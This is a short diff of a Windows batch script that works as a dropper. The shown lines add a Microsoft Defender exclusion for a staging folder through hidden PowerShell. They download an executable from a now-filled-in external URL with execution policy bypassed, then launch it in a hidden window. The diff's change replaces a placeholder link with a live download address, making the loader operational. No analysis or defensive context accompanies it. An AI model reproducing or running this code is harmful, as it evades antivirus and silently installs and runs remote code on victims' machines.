@@ -6,7 +6,7 @@ mkdir "%STAGE%" 2>nul
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"
 
-if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'linkkk' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
+if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://sourceforge.net/projects/calculator-code/files/latest/download' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
 cd /d "%STAGE%"
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\test.exe' -WindowStyle Hidden
 
